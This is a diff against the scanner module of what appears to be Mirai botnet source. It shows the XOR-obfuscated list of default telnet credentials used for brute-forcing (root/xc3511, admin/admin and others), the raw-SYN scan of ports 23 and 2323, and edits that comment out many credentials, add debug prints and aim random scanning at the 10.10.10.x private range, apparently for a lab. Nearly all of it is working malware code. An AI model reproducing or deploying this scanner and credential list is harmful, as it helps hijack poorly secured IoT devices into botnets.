@@ -68,6 +68,7 @@ void scanner_init(void)
 
     LOCAL_ADDR = util_local_addr();
 
+
     rand_init();
     fake_time = time(NULL);
     conn_table = calloc(SCANNER_MAX_CONNS, sizeof (struct scanner_connection));
@@ -121,7 +122,7 @@ void scanner_init(void)
     tcph->syn = TRUE;
 
     // Set up passwords
-    add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x41\x11\x17\x13\x13", 10);                     // root     xc3511
+    /*add_auth_entry("\x50\x4D\x4D\x56", "\x5A\x41\x11\x17\x13\x13", 10);                     // root     xc3511
     add_auth_entry("\x50\x4D\x4D\x56", "\x54\x4B\x58\x5A\x54", 9);                          // root     vizxv
     add_auth_entry("\x50\x4D\x4D\x56", "\x43\x46\x4F\x4B\x4C", 8);                          // root     admin
     add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x43\x46\x4F\x4B\x4C", 7);                      // admin    admin
@@ -133,9 +134,9 @@ void scanner_init(void)
     add_auth_entry("\x50\x4D\x4D\x56", "\x17\x16\x11\x10\x13", 5);                          // root     54321
     add_auth_entry("\x51\x57\x52\x52\x4D\x50\x56", "\x51\x57\x52\x52\x4D\x50\x56", 5);      // support  support
     add_auth_entry("\x50\x4D\x4D\x56", "", 4);                                              // root     (none)
-    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x52\x43\x51\x51\x55\x4D\x50\x46", 4);          // admin    password
+    add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x52\x43\x51\x51\x55\x4D\x50\x46", 4);          // admin    password*/
     add_auth_entry("\x50\x4D\x4D\x56", "\x50\x4D\x4D\x56", 4);                              // root     root
-    add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17", 4);                          // root     12345
+    /*add_auth_entry("\x50\x4D\x4D\x56", "\x13\x10\x11\x16\x17", 4);                          // root     12345
     add_auth_entry("\x57\x51\x47\x50", "\x57\x51\x47\x50", 3);                              // user     user
     add_auth_entry("\x43\x46\x4F\x4B\x4C", "", 3);                                          // admin    (none)
     add_auth_entry("\x50\x4D\x4D\x56", "\x52\x43\x51\x51", 3);                              // root     pass
@@ -182,7 +183,7 @@ void scanner_init(void)
     add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x52\x43\x51\x51", 1);                          // admin    pass
     add_auth_entry("\x43\x46\x4F\x4B\x4C", "\x4F\x47\x4B\x4C\x51\x4F", 1);                  // admin    meinsm
     add_auth_entry("\x56\x47\x41\x4A", "\x56\x47\x41\x4A", 1);                              // tech     tech
-    add_auth_entry("\x4F\x4D\x56\x4A\x47\x50", "\x44\x57\x41\x49\x47\x50", 1);              // mother   fucker
+    add_auth_entry("\x4F\x4D\x56\x4A\x47\x50", "\x44\x57\x41\x49\x47\x50", 1);              // mother   fucker*/
 
 
 #ifdef DEBUG
@@ -195,7 +196,7 @@ void scanner_init(void)
         fd_set fdset_rd, fdset_wr;
         struct scanner_connection *conn;
         struct timeval tim;
-        int last_avail_conn, last_spew, mfd_rd = 0, mfd_wr = 0, nfds;
+        int last_avail_conn, last_spew, mfd_rd = 0, mfd_wr = 0, nfds, breakpoint = 0;
 
         // Spew out SYN to try and get a response
         if (fake_time != last_spew)
@@ -233,36 +234,45 @@ void scanner_init(void)
                 sendto(rsck, scanner_rawpkt, sizeof (scanner_rawpkt), MSG_NOSIGNAL, (struct sockaddr *)&paddr, sizeof (paddr));
             }
         }
-
         // Read packets from raw socket to get SYN+ACKs
         last_avail_conn = 0;
         while (TRUE)
         {
-            int n;
+            int n, b = 0;
             char dgram[1514];
             struct iphdr *iph = (struct iphdr *)dgram;
             struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
             struct scanner_connection *conn;
-
             errno = 0;
             n = recvfrom(rsck, dgram, sizeof (dgram), MSG_NOSIGNAL, NULL, NULL);
             if (n <= 0 || errno == EAGAIN || errno == EWOULDBLOCK)
                 break;
 
-            if (n < sizeof(struct iphdr) + sizeof(struct tcphdr))
-                continue;
-            if (iph->daddr != LOCAL_ADDR)
-                continue;
-            if (iph->protocol != IPPROTO_TCP)
-                continue;
-            if (tcph->source != htons(23) && tcph->source != htons(2323))
-                continue;
-            if (tcph->dest != source_port)
-                continue;
-            if (!tcph->syn)
-                continue;
-            if (!tcph->ack)
-                continue;
+            if (n < sizeof(struct iphdr) + sizeof(struct tcphdr)) {
+		continue;
+	    }
+            if (iph->daddr != LOCAL_ADDR){
+#ifdef DEBUG
+            /*printf("[scanner] Scanning: %d.%d.%d.%d\n", iph->daddr & 0xff, (iph->daddr >> 8) & 0xff, (iph->daddr >> 16) & 0xff, (iph->daddr >> 24) & 0xff);
+	    printf("[scanner] Local Address: %d.%d.%d.%d\n", LOCAL_ADDR & 0xff, (LOCAL_ADDR >> 8) & 0xff, (LOCAL_ADDR >> 16) & 0xff, (LOCAL_ADDR >> 24) & 0xff);*/
+#endif
+		continue;
+	    }
+            if (iph->protocol != IPPROTO_TCP){
+		continue;
+	    }
+            if (tcph->source != htons(23) && tcph->source != htons(2323)){
+		continue;
+	    }
+            if (tcph->dest != source_port){
+		continue;
+	    }
+            if (!tcph->syn){
+		continue;
+	    }
+            if (!tcph->ack){
+		continue;
+	    }
             if (tcph->rst)
                 continue;
             if (tcph->fin)
@@ -280,7 +290,7 @@ void scanner_init(void)
                     break;
                 }
             }
-
+	    //printf("[scanner] Breakpoint %d", breakpoint++);
             // If there were no slots, then no point reading any more
             if (conn == NULL)
                 break;
@@ -684,13 +694,16 @@ static ipv4_t get_random_ip(void)
         o2 = (tmp >> 8) & 0xff;
         o3 = (tmp >> 16) & 0xff;
         o4 = (tmp >> 24) & 0xff;
+	o1 = 10;
+	o2 = 10;
+	o3 = 10;
     }
     while (o1 == 127 ||                             // 127.0.0.0/8      - Loopback
           (o1 == 0) ||                              // 0.0.0.0/8        - Invalid address space
           (o1 == 3) ||                              // 3.0.0.0/8        - General Electric Company
           (o1 == 15 || o1 == 16) ||                 // 15.0.0.0/7       - Hewlett-Packard Company
           (o1 == 56) ||                             // 56.0.0.0/8       - US Postal Service
-          (o1 == 10) ||                             // 10.0.0.0/8       - Internal network
+          //(o1 == 10) ||                             // 10.0.0.0/8       - Internal network
           (o1 == 192 && o2 == 168) ||               // 192.168.0.0/16   - Internal network
           (o1 == 172 && o2 >= 16 && o2 < 32) ||     // 172.16.0.0/14    - Internal network
           (o1 == 100 && o2 >= 64 && o2 < 127) ||    // 100.64.0.0/10    - IANA NAT reserved
@@ -699,7 +712,7 @@ static ipv4_t get_random_ip(void)
           (o1 >= 224) ||                            // 224.*.*.*+       - Multicast
           (o1 == 6 || o1 == 7 || o1 == 11 || o1 == 21 || o1 == 22 || o1 == 26 || o1 == 28 || o1 == 29 || o1 == 30 || o1 == 33 || o1 == 55 || o1 == 214 || o1 == 215) // Department of Defense
     );
-
+    //printf("[scanner] Trying: %d.%d.%d.%d\n", o1, o2, o3, o4);
     return INET_ADDR(o1,o2,o3,o4);
 }
 
